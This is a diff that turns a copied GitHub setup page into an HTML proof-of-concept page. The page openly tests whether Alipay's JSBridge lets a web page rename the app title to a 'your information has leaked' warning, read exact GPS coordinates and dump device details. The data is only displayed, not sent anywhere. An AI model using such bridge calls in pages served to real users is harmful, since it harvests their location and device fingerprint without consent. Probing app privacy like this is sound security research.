@@ -1,53 +1,56 @@
-Skip to content
-gokuscraper
-alipay-test
-Repository navigation
-Code
-Issues
-Pull requests
-Agents
-Actions
-Projects
-Wiki
-Security
-Insights
-Settings
-Owner avatar
-alipay-test
-Public
-Start coding with Codespaces
-Add a README file and start coding in a secure, configurable, and dedicated development environment.
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>我的支付宝安全自测</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        .card { border: 1px solid #ccc; padding: 15px; border-radius: 8px; margin-bottom: 10px; background: #f9f9f9; }
+        .b { font-weight: bold; color: #1677ff; }
+    </style>
+</head>
+<body>
+    <h2>🔍 支付宝隐私权限读取测试</h2>
+    <p>如果看到以下信息，说明 JSBridge 已被成功调取：</p>
 
-Add collaborators to this repository
-Search for people using their GitHub username or email address.
+    <div class="card">
+        <div class="b">1. UI 篡改状态：</div>
+        <div id="ui-status">等待改名...</div>
+    </div>
 
-Quick setup — if you’ve done this kind of thing before
-or	
-https://github.com/gokuscraper/alipay-test.git
-Get started by creating a new file or uploading an existing file. We recommend every repository include a README, LICENSE, and .gitignore.
+    <div class="card">
+        <div class="b">2. 我的精确位置：</div>
+        <div id="gps-info">正在定位...</div>
+    </div>
 
-…or create a new repository on the command line
-echo "# alipay-test" >> README.md
-git init
-git add README.md
-git commit -m "first commit"
-git branch -M main
-git remote add origin https://github.com/gokuscraper/alipay-test.git
-git push -u origin main
-…or push an existing repository from the command line
-git remote add origin https://github.com/gokuscraper/alipay-test.git
-git branch -M main
-git push -u origin main
- ProTip! Use the URL for this page when adding GitHub as a remote.
-Footer
-© 2026 GitHub, Inc.
-Footer navigation
-Terms
-Privacy
-Security
-Status
-Community
-Docs
-Contact
-Manage cookies
-Do not share my personal information
+    <div class="card">
+        <div class="b">3. 手机硬件指纹：</div>
+        <pre id="device-info">正在读取设备参数...</pre>
+    </div>
+
+    <script>
+    document.addEventListener('AlipayJSBridgeReady', function () {
+        // A. 篡改标题
+        AlipayJSBridge.call('setTitle', { title: '⚠️ 你的信息已外泄' });
+        document.getElementById('ui-status').innerText = "标题已被修改为：'你的信息已外泄'";
+
+        // B. 获取 GPS
+        AlipayJSBridge.call('getLocation', function(result) {
+            if (result.error) {
+                document.getElementById('gps-info').innerText = "定位失败（可能未授权）";
+            } else {
+                document.getElementById('gps-info').innerHTML = 
+                    "纬度: " + result.latitude + "<br>经度: " + result.longitude + 
+                    "<br>城市: " + (result.city || "未知");
+            }
+        });
+
+        // C. 获取设备信息
+        AlipayJSBridge.call('getSystemInfo', function(result) {
+            document.getElementById('device-info').innerText = JSON.stringify(result, null, 2);
+        });
+    }, false);
+    </script>
+</body>
+</html>
